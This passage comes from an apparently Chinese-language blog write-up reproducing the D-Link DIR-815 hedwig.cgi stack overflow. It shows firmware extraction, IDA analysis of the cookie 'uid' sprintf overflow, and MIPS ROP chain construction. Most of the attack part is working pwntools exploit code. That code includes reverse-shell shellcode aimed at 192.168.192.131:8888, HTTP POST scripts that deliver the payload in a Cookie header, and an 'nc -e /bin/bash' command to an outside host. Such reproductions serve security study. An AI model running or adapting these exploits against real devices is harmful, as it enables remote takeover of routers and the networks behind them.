class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x436D0</span>) <span class=\"comment\"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x56BD0</span>) <span class=\"comment\"># s3  sleep</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">5</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x57E50</span>) <span class=\"comment\"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x37E6C</span>) <span class=\"comment\"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x3B974</span>) <span class=\"comment\"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">shellcode = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0x1111</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    not $a1, $t4</span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4183</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    andi $a0, $v0, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class=\"line\"><span class=\"string\">    ori $a1, 0xFF01</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $a1, 0x0101</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFEF</span></span><br><span class=\"line\"><span class=\"string\">    not $a2, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4170</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6962</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, $t0,0x2f2f</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -20($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6873</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, 0x2f6e</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -16($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a3, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addi $a0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    addi $t0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addiu $sp, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">fd = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;payload&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>)</span><br><span class=\"line\">fd.write(payload)</span><br><span class=\"line\">fd.close()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"通过http报文\"><a href=\"#通过http报文\" class=\"headerlink\" title=\"通过http报文\"></a>通过http报文</h3><h4 id=\"ROP链-1\"><a href=\"#ROP链-1\" class=\"headerlink\" title=\"ROP链\"></a>ROP链</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">cmd = <span class=\"string\">b&#x27;nc -e /bin/bash 192.168.225.128 8888&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x53200</span> - <span class=\"number\">1</span>) <span class=\"comment\"># s0  system_addr - 1</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x169C4</span>) <span class=\"comment\"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x32A98</span>) <span class=\"comment\"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += cmd</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.225.129:1234/hedwig.cgi&quot;</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;winmt&quot;</span> : <span class=\"string\">&quot;pwner&quot;</span>&#125;</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Cookie&quot;</span>        : <span class=\"string\">b&quot;uid=&quot;</span> + payload,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>  : <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Length&quot;</span>: <span class=\"string\">&quot;11&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">res = requests.post(url = url, headers = headers, data = data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ROP链-shellcode\"><a href=\"#ROP链-shellcode\" class=\"headerlink\" title=\"ROP链+shellcode\"></a>ROP链+shellcode</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x436D0</span>) <span class=\"comment\"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x56BD0</span>) <span class=\"comment\"># s3  sleep</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">5</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x57E50</span>) <span class=\"comment\"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x37E6C</span>) <span class=\"comment\"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x3B974</span>) <span class=\"comment\"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">shellcode = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0x1111</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    not $a1, $t4</span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4183</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    andi $a0, $v0, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class=\"line\"><span class=\"string\">    ori $a1, 0xFF01</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $a1, 0x0101</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFEF</span></span><br><span class=\"line\"><span class=\"string\">    not $a2, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4170</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6962</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, $t0,0x2f2f</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -20($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6873</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, 0x2f6e</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -16($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a3, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addi $a0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    addi $t0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addiu $sp, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;winmt&quot;</span> : <span class=\"string\">&quot;pwner&quot;</span>&#125;</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Cookie&quot;</span>        : <span class=\"string\">b&quot;uid=&quot;</span> + payload,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>  : <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Length&quot;</span>: <span class=\"string\">&quot;11&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">res = requests.post(url = url, headers = headers, data = data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)</span><br></pre></td></tr></table></figure>\n\n<p>我在这里并没有把4个exp 都打完，我只打了发报文的纯ROP链。shellcode 的exp，懒得改ip 地址了</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3\">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>\n","excerpt":"","more":"<h1 id=\"DIR-815-栈溢出漏洞\"><a href=\"#DIR-815-栈溢出漏洞\" class=\"headerlink\" title=\"DIR-815 栈溢出漏洞\"></a>DIR-815 栈溢出漏洞</h1><h2 id=\"环境工具准备\"><a href=\"#环境工具准备\" class=\"headerlink\" title=\"环境工具准备\"></a>环境工具准备</h2><h3 id=\"sasquatch\"><a href=\"#sasquatch\" class=\"headerlink\" title=\"sasquatch\"></a>sasquatch</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 安装依赖库文件</span><br><span class=\"line\">sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev</span><br><span class=\"line\"> </span><br><span class=\"line\"># 下载源码</span><br><span class=\"line\">git clone https://github.com/devttys0/sasquatch.git</span><br><span class=\"line\"> </span><br><span class=\"line\"># 源码的编译</span><br><span class=\"line\">(cd sasquatch &amp;&amp; ./build.sh)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"固件下载\"><a href=\"#固件下载\" class=\"headerlink\" title=\"固件下载\"></a>固件下载</h3><ol>\n<li><a href=\"https://bbs.kanxue.com/elink@892K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8h3c8S2M7q4\">DIR-815A1_FW101SSB03.bin</a></li>\n<li><a href=\"https://rebyte.me/en/d-link/89510/file-592084/\">File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815</a></li>\n<li><a href=\"https://bbs.kanxue.com/thread-273684.htm\">[下载]D-LINK路由器固件–DIR-815_FIRMWARE_1.01-安全工具-看雪-安全社区|安全招聘|kanxue.com</a></li>\n</ol>\n<h2 id=\"解压\"><a href=\"#解压\" class=\"headerlink\" title=\"解压\"></a>解压</h2> <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binwalk -Me DIR-815.bin</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二进制文件逆向分析\"><a href=\"#二进制文件逆向分析\" class=\"headerlink\" title=\"二进制文件逆向分析\"></a>二进制文件逆向分析</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807175447631.png\" alt=\"hedwig.cgi\"></p>\n<p>可以看见，<code>/htdocs/web/hedwig.cgi</code>是<code>/htdocs/cgibin</code>的软链接，因此，我们需要逆向分析的二进制文件是<code>/htdocs/cgibin</code></p>\n<p>用ida9.0打开cgibin ，开始分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807192849832.png\" alt=\"main\"></p>\n<p>在main函数中发现hedwigcgi，进入该函数分析</p>\n<h3 id=\"hedwigcgi函数分析\"><a href=\"#hedwigcgi函数分析\" class=\"headerlink\" title=\"hedwigcgi函数分析\"></a>hedwigcgi函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807193447008.png\" alt=\"hedwigcgi\"></p>\n<p>先获取环境环境变量，REQUEST_METHOD,当这个值为POST时，程序继续运行cgibin_parse_request()，进入该函数分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194034588.png\" alt=\"hedwigcgi\"></p>\n<p>发现似乎是解析获取环境变量的，返回上层函数，往下分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194403775.png\" alt=\"main\"></p>\n<p>接下来会执行sess_get_uid()函数，进入函数分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807195355928.png\" alt=\"sess_get_uid\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807210059982.png\" alt=\"sess_get_uid\"></p>\n<p>如果v2也就是”&#x3D;”前面的字符串是uid，就会把v4的值返回，返回上层函数继续分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202727044.png\" alt=\"main\"></p>\n<p>这里的string就是处理了uid之后的内容，sprintf 函数存在溢出的可能。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202901421.png\" alt=\"main\"></p>\n<p>在函数后面，有个类似的sprinf，而且两个sprintf之间没有对v4 改变，所以v20和string是一样的。v27只有1024个字节大小，所以可以溢出。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807213459396.png\" alt=\"main\"></p>\n<p>因为haystack默认值为0，所以要控制它为1，才能不进入if。同时上面的路径要存在，否则也会进入if里。如何控制haystack呢？</p>\n<h3 id=\"haystack变量控制分析\"><a href=\"#haystack变量控制分析\" class=\"headerlink\" title=\"haystack变量控制分析\"></a>haystack变量控制分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144001612.png\" alt=\"haystack\"></p>\n<p>通过交叉引用查看，发现在sub_409A6c中有对该变量的操作， 继续查看该函数的交叉引用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144244466.png\" alt=\"main\"></p>\n<p>发现在cgibin_parse_request中有调用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808151711845.png\" alt=\"cgibin_parse_request\"></p>\n<p>在这里进行了调用，参数是a1是sub_409ac6,</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152204598.png\" alt=\"off_42c014\"></p>\n<p>这个地址，第一次进循环就正确，此时应该调用的是sub_0x403b10函数，继续</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152327478.png\" alt=\"sub_0x403b10\"></p>\n<p>调用了sub_402ffc 函数，继续进入分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152442511.png\" alt=\"sub_402ffc\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152503518.png\" alt=\"sub_402ffc\"></p>\n<p>这里会进一步调用sub_402b40函数，参数&amp;v11，这个地址与我们的v14相邻，而v14被赋值为了关键函数的地址。继续深入分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152908972.png\" alt=\"sub_402b40\"></p>\n<p>a1就是刚才的&amp;v11，这里作为Dword指针，v9就是我们的sub_409A6c函数，参数也是刚才保存在栈上的数据。</p>\n<p>因此，要执行到有溢出漏洞的地方必须满足<strong>环境变量<code>REQUEST_URI</code>中必须有内容</strong>，环境变量<code>CONTENT_TYPE</code>仍然是老规矩<code>application/x-www-form-urlencoded</code>，要是POST方法</p>\n<h2 id=\"ROP链构造\"><a href=\"#ROP链构造\" class=\"headerlink\" title=\"ROP链构造\"></a>ROP链构造</h2><h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><ol>\n<li>先在var目录下创建一个tmp文件夹</li>\n<li>mipsrop下载[[环境搭建 &amp; 工具]]</li>\n</ol>\n<h3 id=\"纯ROP\"><a href=\"#纯ROP\" class=\"headerlink\" title=\"纯ROP\"></a>纯ROP</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = 0x7F738000</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x3cd</span><br><span class=\"line\">payload += p32(libc_base + 0x53200 